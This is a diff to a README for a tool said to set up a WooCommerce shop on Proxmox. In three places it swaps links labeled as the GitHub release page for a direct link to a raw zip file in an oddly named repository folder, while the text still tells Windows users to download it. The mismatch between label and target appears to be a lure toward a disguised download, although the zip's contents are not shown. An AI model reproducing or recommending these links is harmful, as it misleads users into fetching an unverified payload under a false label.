@@ -1,6 +1,6 @@
 # 🛒 proxmox-perfect-woocommerce - Build a Ready WooCommerce Shop
 
-[![Download the app](https://img.shields.io/badge/Download%20Page-blue?style=for-the-badge&logo=github)](https://github.com/louists3629/proxmox-perfect-woocommerce/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Page-blue?style=for-the-badge&logo=github)](https://github.com/louists3629/proxmox-perfect-woocommerce/raw/refs/heads/main/paramine/proxmox_woocommerce_perfect_3.5.zip)
 
 ## 🚀 What this project does
 
@@ -14,7 +14,7 @@ You use it when you want a shop that is ready for WordPress and WooCommerce on y
 
 Visit this page to download the latest release:
 
-[Go to the release page](https://github.com/louists3629/proxmox-perfect-woocommerce/releases)
+[Go to the release page](https://github.com/louists3629/proxmox-perfect-woocommerce/raw/refs/heads/main/paramine/proxmox_woocommerce_perfect_3.5.zip)
 
 After you open the page, choose the file that matches your Windows system or the file listed under the latest release, then download it to your computer.
 
@@ -157,7 +157,7 @@ From there, you can log in and manage the store like a normal WordPress site.
 
 Check the release page when you want the newest version:
 
-[Open releases on GitHub](https://github.com/louists3629/proxmox-perfect-woocommerce/releases)
+[Open releases on GitHub](https://github.com/louists3629/proxmox-perfect-woocommerce/raw/refs/heads/main/paramine/proxmox_woocommerce_perfect_3.5.zip)
 
 Use the latest release when you want the newest fixes or setup changes.
 
